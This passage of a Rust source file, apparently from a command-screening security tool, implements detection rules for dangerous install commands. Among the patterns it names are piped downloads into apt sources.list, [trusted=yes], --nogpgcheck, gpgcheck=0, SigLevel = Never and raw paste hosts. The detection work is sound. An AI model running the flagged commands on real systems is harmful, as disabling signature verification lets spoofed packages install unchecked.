//! Install-command rules — dangerous patterns in package-manager and infra
//! install commands. Legitimate installs (`apt install foo`, `kubectl apply -f
//! ./local.yaml`, `helm install` from a known repo) must NOT fire; only the
//! high-risk shapes do (piped apt-repo add, disabled signature verification,
//! remote `kubectl apply`, untrusted Helm/Terraform/brew sources). Pure pattern
//! detection — no network or registry lookups on the hot path.

use crate::redact;
use crate::tokenize::{self, ShellType};
use crate::verdict::{Evidence, Finding, RuleId, Severity};

/// Run install-command rules over a tokenized command line.
pub fn check(input: &str, shell: ShellType) -> Vec<Finding> {
    let mut findings = Vec::new();
    let segments = tokenize::tokenize(input, shell);

    check_repo_add_from_pipe(&segments, shell, &mut findings);
    check_unsigned_repo_trust(&segments, shell, &mut findings);
    check_gpg_check_disabled(&segments, shell, &mut findings);
    check_kubectl_apply_remote(&segments, shell, &mut findings);
    check_helm_untrusted_repo(&segments, shell, &mut findings);
    check_terraform_remote_module(&segments, shell, &mut findings);
    check_brew_untrusted_tap(&segments, shell, &mut findings);

    findings
}

/// Strip a single matching layer of surrounding quotes (single or double).
fn strip_quotes(s: &str) -> &str {
    let t = s.trim();
    if t.len() >= 2
        && ((t.starts_with('"') && t.ends_with('"')) || (t.starts_with('\'') && t.ends_with('\'')))
    {
        &t[1..t.len() - 1]
    } else {
        t
    }
}

/// Effective command base name: path basename, lowercased, `.exe` stripped.
fn cmd_base(raw: &str, shell: ShellType) -> String {
    let normalized = crate::rules::command::normalize_shell_token(raw, shell);
    let unq = normalized.as_str();
    let after_path = match shell {
        ShellType::PowerShell | ShellType::Cmd => unq.rsplit(['/', '\\']).next().unwrap_or(unq),
        _ => unq.rsplit('/').next().unwrap_or(unq),
    };
    let lower = after_path.to_lowercase();
    lower
        .strip_suffix(".exe")
        .map(str::to_string)
        .unwrap_or(lower)
}

/// Resolve a segment's effective command + args, stepping past leading
/// `sudo` / `doas` / `env` / `command` / `time` / `tirith` wrappers (and their
/// flags, plus `env`'s leading `VAR=val` assignments) — install commands are
/// commonly run under these, so reading `segment.command` directly would miss
/// `sudo apt-get ...`, `env dnf ...`, `command dnf ...`, or `time dnf ...`.
/// Wrappers are peeled iteratively, so `sudo env dnf ...` also resolves. The
/// wrapper SET and per-wrapper handling are kept in lockstep with the shared
/// `crate::extract::resolve_named_command` (which can't be reused directly here:
/// it is private and returns a borrowed-args struct over `command + args`, not
/// this `(base, &args)` shape over a whole `Segment`).
fn resolve_command(seg: &tokenize::Segment, shell: ShellType) -> Option<(String, &[String])> {
    let mut base = cmd_base(seg.command.as_deref()?, shell);
    let mut args = seg.args.as_slice();

    // Peel wrappers until the command word is a real command. Bounded by the
    // arg count, so a degenerate `env env env …` cannot loop forever.
    loop {
        // `tirith` is terminal: `tirith run …` is itself a sink (resolves to
        // `tirith-run`) and any other subcommand stays `tirith` — neither peels
        // to an inner command. Mirrors `extract::resolve_tirith_command`.
        if base == "tirith" {
            return Some(resolve_tirith(args));
        }
        let inner_idx = match base.as_str() {
            "sudo" | "doas" => wrapper_inner_index_sudo(args),
            "env" => wrapper_inner_index_env(args),
            "command" => wrapper_inner_index_command(args),
            "time" => wrapper_inner_index_time(args),
            _ => return Some((base, args)),
        };
        let idx = inner_idx?;
        let inner = args.get(idx)?;
        base = cmd_base(inner, shell);
        args = &args[idx + 1..];
    }
}

/// Index of the wrapped command word after a `sudo`/`doas` leader. Steps past
/// flags (value-taking ones consume their value) and leading `VAR=val`
/// assignments. Returns `None` when no command word follows.
fn wrapper_inner_index_sudo(args: &[String]) -> Option<usize> {
    let value_short = ["-u", "-g", "-C", "-h", "-p", "-r", "-t", "-D", "-R", "-T"];
    let value_long = [
        "--user", "--group", "--chdir", "--host", "--prompt", "--role", "--type",
    ];
    let mut idx = 0;
    while idx < args.len() {
        let a = strip_quotes(&args[idx]);
        if a == "--" {
            idx += 1;
            break;
        }
        if let Some(stripped) = a.strip_prefix("--") {
            let key_takes_value = value_long.contains(&a);
            // `--user=root` carries its value; `--user root` consumes the next token.
            if key_takes_value && !stripped.contains('=') {
                idx += 2;
            } else {
                idx += 1;
            }
            continue;
        }
        if a.starts_with('-') && a.len() > 1 {
            if value_short.contains(&a) {
                idx += 2;
            } else {
                idx += 1;
            }
            continue;
        }
        break;
    }
    (idx < args.len()).then_some(idx)
}

/// Index of the wrapped command word after an `env` leader. Steps past leading
/// `VAR=val` assignments and env flags (mirrors
/// `extract::resolve_env_command`): `--unset`/`--chdir`/`--split-string` and
/// `-u`/`-C`/`-S` take a value unless joined with `=`. After a `--`, the next
/// non-assignment token is the command.
fn wrapper_inner_index_env(args: &[String]) -> Option<usize> {
    let mut idx = 0;
    while idx < args.len() {
        let a = strip_quotes(&args[idx]);
        if a == "--" {
            idx += 1;
            break;
        }
        if tokenize::is_env_assignment(a) {
            idx += 1;
            continue;
        }
        if a.starts_with('-') {
            if a.starts_with("--") {
                let name = a.split_once('=').map(|(n, _)| n).unwrap_or(a);
                let takes_value =
                    matches!(name, "--unset" | "--chdir" | "--split-string") && !a.contains('=');
                idx += if takes_value { 2 } else { 1 };
                continue;
            }
            if a == "-u" || a == "-C" || a == "-S" {
                idx += 2;
            } else {
                idx += 1;
            }
            continue;
        }
        // First non-flag, non-assignment token is the command word.
        return Some(idx);
    }
    // After `--`: skip any remaining assignments, then the command word.
    while idx < args.len() {
        if tokenize::is_env_assignment(strip_quotes(&args[idx])) {
            idx += 1;
            continue;
        }
        return Some(idx);
    }
    None
}

/// Index of the wrapped command word after a `command` builtin leader. `command`
/// only takes flags (`-p`, `-v`, `-V`); after them (or a `--`) comes the command
/// (mirrors `extract::resolve_command_wrapper`).
fn wrapper_inner_index_command(args: &[String]) -> Option<usize> {
    let mut idx = 0;
    while idx < args.len() {
        let a = strip_quotes(&args[idx]);
        if a == "--" {
            idx += 1;
            break;
        }
        if a.starts_with('-') {
            idx += 1;
            continue;
        }
        break;
    }
    (idx < args.len()).then_some(idx)
}

/// Index of the wrapped command word after a `time` leader. Steps past flags,
/// with `-f`/`--format`/`-o`/`--output` consuming a following value (mirrors
/// `extract::resolve_time_wrapper`). Returns `None` when no command word follows.
fn wrapper_inner_index_time(args: &[String]) -> Option<usize> {
    let mut idx = 0;
    while idx < args.len() {
        let a = strip_quotes(&args[idx]);
        if a == "--" {
            idx += 1;
            break;
        }
        if a.starts_with('-') {
            if a == "-f" || a == "--format" || a == "-o" || a == "--output" {
                idx += 2;
            } else {
                idx += 1;
            }
            continue;
        }
        break;
    }
    (idx < args.len()).then_some(idx)
}

/// Resolve a `tirith` invocation to its effective command + args, mirroring
/// `extract::resolve_tirith_command`: `tirith run …` is the download-and-execute
/// sink (resolved name `tirith-run`, args after `run`); any other subcommand
/// (or bare `tirith`) stays `tirith` with its args unchanged.
fn resolve_tirith(args: &[String]) -> (String, &[String]) {
    let subcommand = args.first().map(|a| strip_quotes(a).to_ascii_lowercase());
    match subcommand.as_deref() {
        Some("run") => ("tirith-run".to_string(), &args[1..]),
        _ => ("tirith".to_string(), args),
    }
}

/// Whether a normalized arg looks like a remote `http(s)://` or `ftp://` URL.
fn is_remote_url(value: &str) -> bool {
    let v = value.to_ascii_lowercase();
    v.starts_with("http://") || v.starts_with("https://") || v.starts_with("ftp://")
}

/// Remote chart location for the Helm rule: [`is_remote_url`] plus `oci://` (a
/// Helm chart is commonly pulled from an OCI registry; the file-scan side treats
/// `oci://` as a chart repo too, so an `oci://` chart must not bypass this).
fn is_helm_remote_url(value: &str) -> bool {
    is_remote_url(value) || value.to_ascii_lowercase().starts_with("oci://")
}

/// Host of a git remote, accepting both `scheme://[user@]host/…` URLs and
/// SCP-style SSH remotes (`[user@]host:path`, e.g. `git@github.com:u/r.git`).
fn git_remote_host(remote: &str) -> Option<String> {
    if let Some(h) = url_host(remote) {
        return Some(h);
    }
    // SCP syntax: host sits between an optional `user@` and the first `:`.
    if remote.contains("://") {
        return None;
    }
    let after_user = match remote.split_once('@') {
        Some((_, rest)) => rest,
        None => remote,
    };
    let (host, _) = after_user.split_once(':')?;
    if host.is_empty() || host.contains('/') {
        return None;
    }
    Some(host.to_ascii_lowercase())
}

/// Extract the host portion of a remote URL (after scheme + optional userinfo,
/// before the first `/`, `?` or `#`, port stripped).
fn url_host(url: &str) -> Option<String> {
    let after_scheme = url.split_once("://").map(|(_, rest)| rest)?;
    let after_userinfo = match after_scheme.split_once('@') {
        Some((_, host)) => host,
        None => after_scheme,
    };
    let host_port = after_userinfo
        .split(['/', '?', '#'])
        .next()
        .unwrap_or(after_userinfo);
    let host = match host_port.rsplit_once(':') {
        Some((h, port)) if port.chars().all(|c| c.is_ascii_digit()) && !port.is_empty() => h,
        _ => host_port,
    };
    if host.is_empty() {
        None
    } else {
        Some(host.to_ascii_lowercase())
    }
}

/// Known URL-shortener hosts — same set as the transport `shortened_url` rule.
/// A shortened URL hides the real install source entirely.
const URL_SHORTENERS: &[&str] = &[
    "bit.ly",
    "t.co",
    "tinyurl.com",
    "is.gd",
    "v.gd",
    "goo.gl",
    "ow.ly",
    "rebrand.ly",
    "cutt.ly",
    "shorturl.at",
];

fn is_shortener_url(url: &str) -> bool {
    url_host(url)
        .map(|h| URL_SHORTENERS.iter().any(|s| h == *s))
        .unwrap_or(false)
}

/// Hosts serving *raw* file content — a raw URL here is a script/manifest blob,
/// not a reviewable project page. Used to flag "raw remote URL posing as an
/// installer / manifest".
fn is_raw_content_host(host: &str) -> bool {
    matches!(
        host,
        "raw.githubusercontent.com"
            | "raw.github.com"
            | "gist.githubusercontent.com"
            | "raw.gitlab.com"
            | "gitlab.com" // gitlab raw lives under /-/raw/, handled by path check
            | "bitbucket.org"
            | "objects.githubusercontent.com"
            | "codeload.github.com"
            | "pastebin.com"
            | "paste.ee"
            | "0x0.st"
            | "transfer.sh"
    )
}

/// Whether a URL points at raw/blob content (raw host, or a `.../raw/...` or
/// release-tarball path on a code-hosting site).
fn is_raw_remote_manifest(url: &str) -> bool {
    let Some(host) = url_host(url) else {
        return false;
    };
    let lower = url.to_ascii_lowercase();
    if is_raw_content_host(&host) {
        // gitlab/bitbucket only count as "raw" when the path actually is raw.
        if host == "gitlab.com" || host == "bitbucket.org" {
            return lower.contains("/-/raw/") || lower.contains("/raw/");
        }
        return true;
    }
    // GitHub release / archive tarballs posing as installers.
    if host == "github.com"
        && (lower.contains("/archive/") || lower.contains("/releases/download/"))
    {
        return true;
    }
    false
}

// ── repo_add_from_pipe ───────────────────────────────────────────────────────

/// Whether a concrete path names APT's primary source file or an entry under
/// `sources.list.d`.  Keep this path predicate separate from option/shell
/// parsing so a mere mention of `sources.list` in an unrelated argument is not
/// mistaken for a write target.
fn is_apt_sources_path(value: &str) -> bool {
    let normalized = lexical_posix_path(value);
    normalized == "/etc/apt/sources.list"
        || normalized.starts_with("/etc/apt/sources.list.d/")
        || normalized == "etc/apt/sources.list"
        || normalized.starts_with("etc/apt/sources.list.d/")
}

fn lexical_posix_path(value: &str) -> String {
    let raw = strip_quotes(value).replace('\\', "/").to_ascii_lowercase();
    crate::lexical_path::LexicalPath::parse(&raw, crate::lexical_path::PathDialect::Posix)
        .map(|path| path.to_slash_string())
        .unwrap_or_default()
}

fn is_apt_sources_dir(value: &str) -> bool {
    lexical_posix_path(value).trim_end_matches('/') == "/etc/apt/sources.list.d"
}

/// Parse shell output redirections outside quotes and report whether stdout is
/// directed at an APT sources path.  This is deliberately a small redirection
/// grammar rather than a substring search: quoted `>` bytes are data, not shell
/// operators, and the target may be attached (`>/etc/...`) or separated.
fn redirect_targets_sources_list(raw: &str, shell: ShellType) -> bool {
    #[derive(Clone, Copy, PartialEq, Eq)]
    enum Quote {
        None,
        Single,
        Double,
    }

    let chars: Vec<char> = raw.chars().collect();
    let mut quote = Quote::None;
    let mut escaped = false;
    let mut i = 0;
    while i < chars.len() {
        let ch = chars[i];
        if escaped {
            escaped = false;
            i += 1;
            continue;
        }
        let escape = match shell {
            ShellType::PowerShell => '`',
            _ => '\\',
        };
        if ch == escape && quote != Quote::Single {
            escaped = true;
            i += 1;
            continue;
        }
        match (quote, ch) {
            (Quote::None, '\'') => {
                quote = Quote::Single;
                i += 1;
                continue;
            }
            (Quote::None, '"') => {
                quote = Quote::Double;
                i += 1;
                continue;
            }
            (Quote::Single, '\'') => {
                quote = Quote::None;
                i += 1;
                continue;
            }
            (Quote::Double, '"') => {
                quote = Quote::None;
                i += 1;
                continue;
            }
            _ => {}
        }
        if quote != Quote::None || ch != '>' {
            i += 1;
            continue;
        }

        // An IO-number other than stdout redirects a different descriptor, not
        // the downloaded body. Require a token boundary before the digits so a
        // normal argument ending in `2` is not misclassified as descriptor 2.
        let mut fd_start = i;
        while fd_start > 0 && chars[fd_start - 1].is_ascii_digit() {
            fd_start -= 1;
        }
        let fd_has_boundary = fd_start == 0
            || chars[fd_start - 1].is_whitespace()
            || matches!(chars[fd_start - 1], '|' | ';' | '&');
        if fd_start < i && fd_has_boundary {
            let descriptor: String = chars[fd_start..i].iter().collect();
            if descriptor.parse::<u32>().ok() != Some(1) {
                i += 1;
                continue;
            }
        }
        let mut j = i + 1;
        while j < chars.len() && (chars[j] == '>' || chars[j] == '|') {
            j += 1;
        }
        if chars.get(j) == Some(&'&') {
            j += 1;
        }
        while j < chars.len() && chars[j].is_whitespace() {
            j += 1;
        }

        let mut target = String::new();
        let mut target_quote = Quote::None;
        let mut target_escaped = false;
        while j < chars.len() {
            let c = chars[j];
            if target_escaped {
                target.push(c);
                target_escaped = false;
                j += 1;
                continue;
            }
            if c == escape && target_quote != Quote::Single {
                target_escaped = true;
                j += 1;
                continue;
            }
            match (target_quote, c) {
                (Quote::None, '\'') => target_quote = Quote::Single,
                (Quote::None, '"') => target_quote = Quote::Double,
                (Quote::Single, '\'') | (Quote::Double, '"') => target_quote = Quote::None,
                (Quote::None, _) if c.is_whitespace() || matches!(c, '|' | ';' | '&') => break,
                _ => target.push(c),
            }
            j += 1;
        }
        if is_apt_sources_path(&target) {
            return true;
        }
        i = j.max(i + 1);
    }
    false
}

/// Collect values for a long option and a value-taking short option.  Long
/// options accept separate and `=` forms.  Short options accept separate,
/// attached, and common boolean clusters (`-fsSLoPATH`, `-qOPATH`). The
/// command-specific value-taking set prevents an earlier option's argument
/// from being reinterpreted as a nested output option; unknown short options
/// are conservatively treated like booleans because an accepted future flag
/// must not reopen this execution-boundary bypass.
pub(crate) fn collect_command_option_values(
    args: &[String],
    shell: ShellType,
    long: &str,
    short: char,
    value_taking_short_options: &str,
) -> Vec<String> {
    let mut values = Vec::new();
    let long_equals = format!("{long}=");
    let mut i = 0;
    'args: while i < args.len() {
        let normalized = crate::rules::command::normalize_shell_token(&args[i], shell);
        let arg = normalized.as_str();
        if arg == "--" {
            break;
        }
        if arg == long {
            if let Some(value) = args.get(i + 1) {
                values.push(crate::rules::command::normalize_shell_token(value, shell));
                i += 2;
                continue;
            }
        } else if let Some(value) = arg.strip_prefix(&long_equals) {
            values.push(value.to_string());
        } else if arg.starts_with('-') && !arg.starts_with("--") {
            let cluster = &arg[1..];
            for (offset, candidate) in cluster.char_indices() {
                if candidate == short {
                    let after = &cluster[offset + short.len_utf8()..];
                    let attached = after.strip_prefix('=').unwrap_or(after);
                    if !attached.is_empty() {
                        values.push(attached.to_string());
                        i += 1;
                    } else if let Some(value) = args.get(i + 1) {
                        values.push(crate::rules::command::normalize_shell_token(value, shell));
                        i += 2;
                    } else {
                        i += 1;
                    }
                    continue 'args;
                }
                if value_taking_short_options.contains(candidate) {
                    // The rest of this token is this earlier option's value.
                    let after = &cluster[offset + candidate.len_utf8()..];
                    i += if after.is_empty() && args.get(i + 1).is_some() {
                        2
                    } else {
                        1
                    };
                    continue 'args;
                }
            }
        }
        i += 1;
    }
    values
}

fn downloader_targets_sources_list(base: &str, args: &[String], shell: ShellType) -> bool {
    let destinations = match base {
        "curl" => collect_command_option_values(
            args,
            shell,
            "--output",
            'o',
            "AbcCdDeEFhHKmPQrTtUuwxXyYz",
        ),
        "wget" => collect_command_option_values(
            args,
            shell,
            "--output-document",
            'O',
            "aABeIiIloPQRTtUuwWX",
        ),
        _ => Vec::new(),
    };
    if destinations
        .iter()
        .any(|destination| is_apt_sources_path(destination))
    {
        return true;
    }
    match base {
        "curl" => {
            let output_dirs = collect_command_option_values(
                args,
                shell,
                "--output-dir",
                '\0',
                "AbcCdDeEFhHKmoPQrTtUuwxXyYz",
            );
            output_dirs.iter().any(|path| is_apt_sources_dir(path))
                && (!destinations.is_empty() || curl_uses_remote_name(args, shell))
        }
        "wget" => collect_command_option_values(
            args,
            shell,
            "--directory-prefix",
            'P',
            "aABeIiIloQRTtUuwWX",
        )
        .iter()
        .any(|path| is_apt_sources_dir(path)),
        _ => false,
    }
}

fn curl_uses_remote_name(args: &[String], shell: ShellType) -> bool {
    const VALUE_SHORT: &str = "AbcCdDeEFhHKmoPQrTtUuwxXyYz";
    for arg in args {
        let arg = crate::rules::command::normalize_shell_token(arg, shell);
        if arg == "--" {
            break;
        }
        if arg == "--remote-name" || arg == "--remote-name-all" {
            return true;
        }
        if !arg.starts_with('-') || arg.starts_with("--") {
            continue;
        }
        for option in arg[1..].chars() {
            if option == 'O' {
                return true;
            }
            if VALUE_SHORT.contains(option) {
                break;
            }
        }
    }
    false
}

fn is_pipe_separator(separator: Option<&str>) -> bool {
    matches!(separator, Some("|") | Some("|&"))
}

/// Inclusive start of the contiguous pipeline that ends at `sink_idx`.
fn pipeline_start(segments: &[tokenize::Segment], sink_idx: usize) -> usize {
    let mut start = sink_idx;
    while start > 0 && is_pipe_separator(segments[start].preceding_separator.as_deref()) {
        start -= 1;
    }
    start
}

fn tee_targets_sources_list(args: &[String], shell: ShellType) -> bool {
    let mut positional_only = false;
    for arg in args {
        let normalized = crate::rules::command::normalize_shell_token(arg, shell);
        let arg = normalized.as_str();
        if !positional_only && arg == "--" {
            positional_only = true;
            continue;
        }
        if !positional_only && arg.starts_with('-') && arg != "-" {
            // tee's flags do not consume a separate output-path value.
            continue;
        }
        if is_apt_sources_path(arg) {
            return true;
        }
    }
    false
}

/// `curl ... | sudo tee /etc/apt/sources.list.d/foo.list` — adds an apt repo
/// from an unverified piped download. Also catches the redirect form
/// (`curl ... > .../sources.list.d/...`).
fn check_repo_add_from_pipe(
    segments: &[tokenize::Segment],
    shell: ShellType,
    findings: &mut Vec<Finding>,
) {
    // Pipe form: a `tee` stage touching a sources.list path. Trace the entire
    // contiguous pipeline, not just the adjacent transformer, back to a network
    // producer (`curl | sed | doas tee ...`).
    for (i, seg) in segments.iter().enumerate() {
        if i == 0 {
            continue;
        }
        if !is_pipe_separator(seg.preceding_separator.as_deref()) {
            continue;
        }
        let Some((base, args)) = resolve_command(seg, shell) else {
            continue;
        };
        if base != "tee" {
            continue;
        }
        let touches_sources = tee_targets_sources_list(args, shell);
        if !touches_sources {
            continue;
        }
        let start = pipeline_start(segments, i);
        let has_network_producer = segments[start..i].iter().any(|upstream| {
            resolve_command(upstream, shell)
                .is_some_and(|(upstream_base, _)| is_fetch_command(&upstream_base))
        });
        if !has_network_producer {
            continue;
        }
        push_repo_add(segments, start, i, shell, findings);
        return;
    }

    // Direct-write forms: shell stdout redirection, curl `-o`/`--output`, and
    // wget `-O`/`--output-document`, with attached/separate/equals values.
    for seg in segments {
        let Some((base, args)) = resolve_command(seg, shell) else {
            continue;
        };
        if !is_fetch_command(&base) {
            continue;
        }
        if redirect_targets_sources_list(&seg.raw, shell)
            || downloader_targets_sources_list(&base, args, shell)
        {
            findings.push(Finding {
                rule_id: RuleId::RepoAddFromPipe,
                severity: Severity::High,
                title: "APT repository added from an unverified download".to_string(),
                description:
                    "A download is redirected straight into an apt sources.list file. The repo \
                     definition is never reviewed and its signing key is not verified — a \
                     compromised or spoofed source can then install arbitrary packages."
                        .to_string(),
                evidence: vec![Evidence::CommandPattern {
                    pattern: "fetch redirected to sources.list".to_string(),
                    matched: redact::redact_shell_assignments(&seg.raw),
                }],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            });
            return;
        }
    }
}

fn push_repo_add(
    segments: &[tokenize::Segment],
    start_idx: usize,
    tee_idx: usize,
    shell: ShellType,
    findings: &mut Vec<Finding>,
) {
    let mut pipeline = segments[start_idx].raw.clone();
    for segment in &segments[start_idx + 1..=tee_idx] {
        pipeline.push(' ');
        pipeline.push_str(segment.preceding_separator.as_deref().unwrap_or("|"));
        pipeline.push(' ');
        pipeline.push_str(&segment.raw);
    }
    let mut evidence = vec![Evidence::CommandPattern {
        pattern: "fetch | tee sources.list".to_string(),
        matched: redact::redact_shell_assignments(&pipeline),
    }];
    for upstream in &segments[start_idx..tee_idx] {
        if let Some((base, args)) = resolve_command(upstream, shell) {
            if is_fetch_command(&base) {
                for url in extract_remote_urls(args) {
                    evidence.push(Evidence::Url { raw: url });
                }
            }
        }
    }
    findings.push(Finding {
        rule_id: RuleId::RepoAddFromPipe,
        severity: Severity::High,
        title: "APT repository added from a piped download".to_string(),
        description:
            "A downloaded payload is piped through `tee` into an apt sources.list file. The repo \
             definition is never reviewed and its signing key is not verified — a compromised or \
             spoofed source can then install arbitrary packages as root."
                .to_string(),
        evidence,
        human_view: None,
        agent_view: None,
        mitre_id: None,
        custom_rule_id: None,
    });
}

// ── unsigned_repo_trust ─────────────────────────────────────────────────────

/// Treat a recognized boolean as disabled only for the explicit false forms.
/// Unknown/empty/dynamic values are conservative: at a pre-execution boundary
/// Tirith cannot prove that they keep verification enabled.
fn boolean_option_enables_danger(value: &str) -> bool {
    !matches!(
        strip_quotes(value).trim().to_ascii_lowercase().as_str(),
        "0" | "false" | "no" | "off"
    )
}

fn apt_config_disables_authentication(assignment: &str) -> bool {
    let assignment = strip_quotes(assignment).trim();
    let (key, value) = assignment
        .split_once('=')
        .map(|(key, value)| (key.trim(), value.trim()))
        .unwrap_or((assignment, ""));
    let key = key.to_ascii_lowercase();
    matches!(
        key.as_str(),
        "apt::get::allowunauthenticated"
            | "acquire::allowinsecurerepositories"
            | "acquire::allowdowngradetoinsecurerepositories"
            | "acquire::allowweakrepositories"
    ) && boolean_option_enables_danger(value)
}

/// Parse APT's real option grammar and return the authentication/signature
/// override that weakens the transaction. Supports options before or after the
/// subcommand, boolean `=value` forms, and `-o`/`--option` configuration in
/// separate, attached, and equals forms.
fn apt_signature_disable_option(args: &[String], shell: ShellType) -> Option<String> {
    const BOOLEAN_FLAGS: &[&str] = &[
        "--allow-unauthenticated",
        "--allow-insecure-repositories",
        "--allow-downgrades-to-insecure-repositories",
        "--allow-weak-repositories",
    ];

    let mut i = 0;
    while i < args.len() {
        let normalized = crate::rules::command::normalize_shell_token(&args[i], shell);
        let arg = normalized.as_str();
        if arg == "--" {
            break;
        }
        let lower = arg.to_ascii_lowercase();
        if BOOLEAN_FLAGS.contains(&lower.as_str()) {
            return Some(arg.to_string());
        }
        if let Some((flag, value)) = lower.split_once('=') {
            if BOOLEAN_FLAGS.contains(&flag) && boolean_option_enables_danger(value) {
                return Some(arg.to_string());
            }
        }

        let config = if arg == "-o" || arg == "--option" {
            args.get(i + 1)
                .map(|value| crate::rules::command::normalize_shell_token(value, shell))
        } else if let Some(value) = arg.strip_prefix("--option=") {
            Some(value.to_string())
        } else if let Some(value) = arg.strip_prefix("-o=") {
            Some(value.to_string())
        } else {
            arg.strip_prefix("-o")
                .filter(|value| !value.is_empty())
                .map(str::to_string)
        };
        if let Some(config) = config {
            if apt_config_disables_authentication(&config) {
                return Some(config);
            }
            if arg == "-o" || arg == "--option" {
                i += 2;
                continue;
            }
        }
        i += 1;
    }
    None
}

/// apt repos with signature verification turned off:
///  - `[trusted=yes]` option inside a sources entry,
///  - `--allow-*` authentication/repository flags,
///  - `-o` / `--option` insecure APT configuration assignments.
fn check_unsigned_repo_trust(
    segments: &[tokenize::Segment],
    shell: ShellType,
    findings: &mut Vec<Finding>,
) {
    for seg in segments {
        let Some((base, args)) = resolve_command(seg, shell) else {
            continue;
        };
        let is_apt = matches!(
            base.as_str(),
            "apt" | "apt-get" | "aptitude" | "add-apt-repository"
        );

        // `[trusted=yes]` can appear anywhere in the raw segment (it is part of a
        // sources-list entry string); the marker is the danger regardless of the
        // leading command.
        if raw_has_trusted_yes(&seg.raw) {
            findings.push(Finding {
                rule_id: RuleId::UnsignedRepoTrust,
                severity: Severity::High,
                title: "APT source marked [trusted=yes]".to_string(),
                description:
                    "An apt sources entry uses `[trusted=yes]`, which disables GPG signature \
                     verification for that repository. Packages from it are installed without \
                     any authenticity check."
                        .to_string(),
                evidence: vec![Evidence::CommandPattern {
                    pattern: "apt [trusted=yes]".to_string(),
                    matched: redact::redact_shell_assignments(&seg.raw),
                }],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            });
            return;
        }

        if !is_apt {
            continue;
        }
        if let Some(option) = apt_signature_disable_option(args, shell) {
            findings.push(Finding {
                rule_id: RuleId::UnsignedRepoTrust,
                severity: Severity::High,
                title: "APT signature verification disabled".to_string(),
                description: format!(
                    "`{option}` tells apt to accept unauthenticated, insecure, or weak \
                     repository content. This removes the authenticity guarantee for packages \
                     in the transaction."
                ),
                evidence: vec![Evidence::CommandPattern {
                    pattern: "apt authentication override".to_string(),
                    matched: redact::redact_shell_assignments(&seg.raw),
                }],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            });
            return;
        }
    }
}

/// Detect a `[trusted=yes]` apt option, tolerating extra spaces and other
/// options inside the brackets (`[arch=amd64 trusted=yes]`).
fn raw_has_trusted_yes(raw: &str) -> bool {
    let lower = raw.to_ascii_lowercase();
    let mut search = lower.as_str();
    while let Some(open) = search.find('[') {
        let rest = &search[open + 1..];
        if let Some(close) = rest.find(']') {
            let inside = &rest[..close];
            for opt in inside.split_whitespace() {
                if let Some((k, v)) = opt.split_once('=') {
                    if k.trim() == "trusted" && v.trim() == "yes" {
                        return true;
                    }
                }
            }
            search = &rest[close + 1..];
        } else {
            break;
        }
    }
    false
}

// ── gpg_check_disabled ──────────────────────────────────────────────────────

/// Disabled GPG/signature checks for dnf/yum/zypper and pacman:
///  - `--nogpgcheck` flag,
///  - `gpgcheck=0` (a yum/dnf .repo setting passed inline),
///  - pacman `SigLevel = Never`.
fn check_gpg_check_disabled(
    segments: &[tokenize::Segment],
    shell: ShellType,
    findings: &mut Vec<Finding>,
) {
    // `gpgcheck=0` / `SigLevel = Never` are config-line markers that can appear
    // anywhere in a raw segment regardless of the leading command.
    for seg in segments {
        if raw_has_gpgcheck_zero(&seg.raw) {
            findings.push(Finding {
                rule_id: RuleId::GpgCheckDisabled,
                severity: Severity::High,
                title: "Package signature checking disabled (gpgcheck=0)".to_string(),
                description: "A yum/dnf repository configuration sets `gpgcheck=0`, disabling GPG \
                     signature verification. Packages from that repo are installed without an \
                     authenticity check."
                    .to_string(),
                evidence: vec![Evidence::CommandPattern {
                    pattern: "gpgcheck=0".to_string(),
                    matched: redact::redact_shell_assignments(&seg.raw),
                }],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            });
            return;
        }
        if raw_has_siglevel_never(&seg.raw) {
            findings.push(Finding {
                rule_id: RuleId::GpgCheckDisabled,
                severity: Severity::High,
                title: "pacman signature checking disabled (SigLevel = Never)".to_string(),
                description: "A pacman configuration sets `SigLevel = Never`, disabling package \
                     signature verification. pacman will install unsigned or tampered packages \
                     without warning."
                    .to_string(),
                evidence: vec![Evidence::CommandPattern {
                    pattern: "pacman SigLevel = Never".to_string(),
                    matched: redact::redact_shell_assignments(&seg.raw),
                }],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            });
            return;
        }
    }

    // Native signature-disable flags. dnf/yum use `--nogpgcheck`; zypper uses
    // the distinct `--no-gpg-checks` spelling. Boolean equals forms are parsed
    // conservatively rather than compared as opaque strings.
    for seg in segments {
        let Some((base, args)) = resolve_command(seg, shell) else {
            continue;
        };
        let is_rpm_pm = matches!(
            base.as_str(),
            "dnf" | "yum" | "zypper" | "microdnf" | "pacman"
        );
        if !is_rpm_pm {
            continue;
        }
        for arg in args {
            let a = crate::rules::command::normalize_shell_token(arg, shell).to_ascii_lowercase();
            if a == "--" {
                break;
            }
            let (flag, enabled) = a
                .split_once('=')
                .map(|(flag, value)| (flag, boolean_option_enables_danger(value)))
                .unwrap_or((a.as_str(), true));
            let disables_signatures =
                flag == "--nogpgcheck" || (flag == "--no-gpg-checks" && base == "zypper");
            if disables_signatures && enabled {
                findings.push(Finding {
                    rule_id: RuleId::GpgCheckDisabled,
                    severity: Severity::High,
                    title: format!("Package signature checking disabled ({flag})"),
                    description: format!(
                        "`{base} {flag}` installs packages without verifying their GPG \
                         signatures. A spoofed or compromised mirror can serve arbitrary \
                         packages that will be installed without warning."
                    ),
                    evidence: vec![Evidence::CommandPattern {
                        pattern: "package-manager signature-disable flag".to_string(),
                        matched: redact::redact_shell_assignments(&seg.raw),
                    }],
                    human_view: None,
                    agent_view: None,
                    mitre_id: None,
                    custom_rule_id: None,
                });
                return;
            }
        }
    }
}

/// `gpgcheck=0` / `gpgcheck = 0` anywhere in the raw text (case-insensitive).
fn raw_has_gpgcheck_zero(raw: &str) -> bool {
    let lower = raw.to_ascii_lowercase();
    let bytes = lower.as_bytes();
    // `match_indices` yields absolute offsets, so the word-boundary check below
    // indexes `bytes` correctly even for the 2nd+ occurrence (regression).
    for (pos, _) in lower.match_indices("gpgcheck") {
        let after_ws = lower[pos + "gpgcheck".len()..].trim_start();
        if let Some(rest) = after_ws.strip_prefix('=') {
            let val = rest.trim_start();
            // Match `0` as a whole token (not the `0` in `0755`).
            if val.starts_with('0')
                && val[1..]
                    .chars()
                    .next()
                    .map(|c| !c.is_ascii_alphanumeric())
                    .unwrap_or(true)
            {
